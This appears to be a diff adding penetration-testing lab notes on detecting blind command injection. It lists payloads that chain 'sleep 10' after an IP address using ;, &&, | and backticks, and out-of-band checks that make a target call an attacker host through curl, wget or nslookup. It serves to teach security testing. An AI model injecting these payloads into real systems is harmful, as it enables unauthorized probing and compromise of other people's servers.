@@ -1,0 +1,26 @@
+blind based
+
+127.0.0.1; sleep 10
+127.0.0.1 && sleep 10
+127.0.0.1 | sleep 10
+127.0.0.1` sleep 10`
+
+2. Out-of-band (OOB) detection — using your attacker host
+
+Same idea as blind XXE: instead of waiting for a delay, you make the vulnerable server reach out to a server you control, 
+and you just watch for the request to land.
+Using your attacker host's Python listener (python3 -m http.server 8080), you'd inject something like:
+
+127.0.0.1; curl http://prasannak.attacker.vuln.lab.netspi-u.com:8080/cmdi-confirm1
+127.0.0.1 && wget http://prasannak.attacker.vuln.lab.netspi-u.com:8080/cmdi-confirm2
+127.0.0.1 | nslookup prasannak.attacker.vuln.lab.netspi-u.com
+
+
+Which commands to use, depending on what tools might exist on the target
+Since you don't know what's installed on the backend, try a few variants — if one binary isn't there, another might be:
+
+curl http://your-attacker-host:8080/x
+wget http://your-attacker-host:8080/x
+nslookup your-attacker-host
+ping -c 1 your-attacker-host   (confirms execution but not OOB HTTP specifically)
+
